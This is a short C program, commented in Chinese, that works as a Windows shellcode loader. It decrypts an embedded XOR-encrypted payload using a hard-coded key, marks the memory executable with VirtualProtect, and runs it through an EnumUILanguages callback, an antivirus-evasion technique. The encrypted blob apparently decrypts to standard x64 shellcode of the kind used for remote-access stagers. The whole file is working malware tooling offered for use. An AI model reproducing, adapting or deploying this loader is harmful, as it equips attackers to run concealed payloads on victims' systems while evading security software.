#include <Windows.h>
#include<stdio.h>

int main() {
    // 存放xor加密后的shellcode
    char encryptedShellcode[] = "\x94\x2d\xed\x96\x89\xd9\xfe\x33\x34\x35\x77\x30\x20\x7b\x7f\x6c\x6b\x08\x50\xa1\x01\x20\xee\x3c\x12\x31\xba\x60\x2b\x7c\xbe\x64\x41\x29\xa0\x5f\x6d\x70\x71\xa8\x3b\x6b\xdf\x2f\x24\x3a\x48\xf1\x9e\x0f\x55\x49\x34\x4d\x41\x6a\xec\xf4\x30\x01\x60\xb2\x86\x85\x37\x2f\x23\x31\xba\x60\x13\xbf\x77\x0a\x29\x60\xfb\x4b\xbc\x45\x58\x6a\x71\x6b\xed\x17\x6e\x72\x79\xba\xb2\xbb\x34\x35\x36\x29\xe4\xeb\x59\x5a\x75\x41\xb1\x23\xef\x20\x7d\x2a\xf9\x39\x11\x7b\x32\xe4\xd6\x60\x2c\x50\xe2\x65\xc2\xf4\x01\xea\x47\xec\x20\x64\xb8\x3a\x48\xf1\x9e\x72\xf5\xfc\x3b\x20\x60\xea\x15\xdd\x48\xb1\x2d\x70\x28\x4c\x6d\x2b\x4b\xa8\x44\xea\x6b\x70\xbe\x76\x45\x28\x2a\xfd\x5b\x7c\xcb\x6d\x3b\x20\xe3\x25\x72\x3b\x78\xe1\x73\xb8\x30\xbd\x7e\x60\xb1\x6a\x75\x7c\x65\x1e\x38\x29\x25\x30\x24\x37\x33\x23\x79\xb1\xdf\x14\x74\x64\x9e\x81\x73\x6c\x64\x67\x08\xea\x61\x8d\x23\x9a\x91\x8d\x24\x78\x8c\x44\x47\x07\x69\x52\x53\x2b\x2d\x7c\x6b\x09\xe8\x95\x2c\xe9\x89\xce\x73\x79\x31\x7b\xba\xd1\x7c\x8a\x63\x61\x3a\x71\xfd\x95\x6f\xfa\x32\x30\x21\xec\x8a\x3e\xf0\xc0\x73\x89\x78\x42\x10\x66\x9e\xfe\x61\xb4\xd7\x28\x60\x72\x64\x68\x3c\x2f\xc8\x50\xb1\x59\x33\xcb\xe0\x5c\x6b\x20\x75\x7d\x6d\x70\x71\xa8\x3e\x55\xa8\x2d\x91\xb2\x31\xb8\xf0\x7b\xcb\xf5\x7e\xe8\xa0\x6a\x97\xd7\x32\x9f\x81\x8c\xb1\x20\xec\xa9\x18\x69\x70\x6a\x7f\xbd\xd7\x7e\xe8\x98\x6a\x97\xa4\x98\x34\x00\x8c\xb1\xed\xa5\x1a\x78\x30\xce\xfc\x46\xd1\xdd\xa5\x61\x61\x2b\x65\xbe\xd1\x50\x29\xfa\x86\x25\x54\xa7\x18\x7d\x70\x6a\x7b\xbd\xcc\x77\xdb\x63\xf2\xe5\x62\xc2\x95\xe2\x8b\x64\x16\x30\x26\xf1\xbd\x11\x6c\xba\xc2\x5f\x76\x20\x38\x43\x2d\x2d\x3d\x40\x20\x2b\x2c\xe1\x97\x26\x43\xb0\x70\x88\x6b\x90\x66\xd3\x9e\xb4\x63\xa4\xfe\x74\xc9\xa6\x3e\x55\xa1\x2c\xe7\x82\x31\xb8\xe8\x7b\xbd\xcc\x77\xdb\x63\xf2\xe5\x62\xc2\x95\xe2\x8b\x64\x15\x4d\x36\x33\x2e\x68\x5a\x33\x74\x35\x36\x20\x39\x41\x2d\x67\x7c\xfa\x6a\x5c\x6b\x58\x9a\xbb\x25\x20\x70\x88\x46\x5a\x78\x57\x9e\xb4\x62\xd2\xf3\xd4\x7c\x9e\x8c\x9b\x20\x64\xad\x3a\x50\xf7\x7a\xb6\xc2\x40\x82\x20\x9e\xcc\x75\x57\x3d\x19\x28\xb4\xa6\x98\xd0\xcc\x24\x86\xe4";
    
    // 定义解密所用的密钥

    char key[] = "henry123456aa+-==@asd";

    // 定义一个与加密shellcode大小相同的数组用于存储解密后的shellcode
    unsigned char shellcode[sizeof encryptedShellcode];

    // 获取密钥的长度
    int keylength = strlen(key);

    // 遍历加密的shellcode，并使用异或操作进行解密，将结果存储在shellcode数组中
    for (int i = 0; i < sizeof encryptedShellcode; i++) {
        shellcode[i] = encryptedShellcode[i] ^ key[i % keylength];
        printf("\\x%x", shellcode[i]);
    }

    // 获取解密后的shellcode的地址
    char* addrShellcode = (char*)shellcode;

    // 声明一个DWORD变量用于存储旧的内存保护属性
    DWORD dwOldPro = 0;

    // 更改解密后的shellcode所在内存区域的保护属性，允许执行、读、写
    BOOL ifExec = VirtualProtect(addrShellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldPro);

    // 使用EnumUILanguages函数执行解密后的shellcode
    EnumUILanguages((UILANGUAGE_ENUMPROC)addrShellcode, 0, 0);
}